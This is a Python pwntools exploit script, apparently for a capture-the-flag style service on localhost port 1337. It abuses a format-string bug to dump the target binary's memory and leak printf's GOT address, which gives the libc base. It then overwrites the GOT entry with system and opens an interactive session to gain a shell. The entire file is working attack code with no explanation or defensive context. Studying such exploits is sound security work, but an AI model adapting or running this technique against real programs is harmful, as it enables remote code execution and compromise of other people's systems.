from pwn import *
from FMT import *

def exec_fmt(payload):
	io = remote("127.0.0.1", 1337)
	io.sendline(payload)
	out = io.recvrepeat(1)
	io.close()
	return out


def leak_binary():
	marker = "tttt"
	fmt = FMT(exec_fmt, 32, offset = 7, padding = 0, marker = marker)

	start = 0x8049000
	final = 0x804b000

	io = remote("127.0.0.1", 1337)
	
	while True:
		payload = fmt.leak(start)
		if "\n" in payload:
			content = "\x00"
		else:
			io.sendline(payload)
			io.recvuntil(marker)	
			content = io.recvuntil(marker.upper())[:-len(marker)] + "\x00"
		
		with open("binary_leak", "a") as f:
			f.write(content)

		start += len(content)

def exploit():
	printf_got = 0x0804a010
	marker = "tttt"
	fmt = FMT(exec_fmt, 32, offset = 7, padding = 0, marker = marker)
	
	io = remote("127.0.0.1", 1337)
	
	payload = fmt.leak(printf_got)
	io.sendline(payload)
	io.recvuntil(marker)	

	printf = u32(io.recv(4))
	libc = printf - 0x000512d0
	system = libc + 0x0003d200

	assert libc & 0xfff == 0

	log.info("printf {}".format(hex(printf)))
	log.info("libc {}".format(hex(libc)))
	log.info("system {}".format(hex(system)))

	payload = fmt.write32(printf_got, system, "byte")
	io.sendline(payload)
	io.interactive()
	
	io.close()

exploit()

	
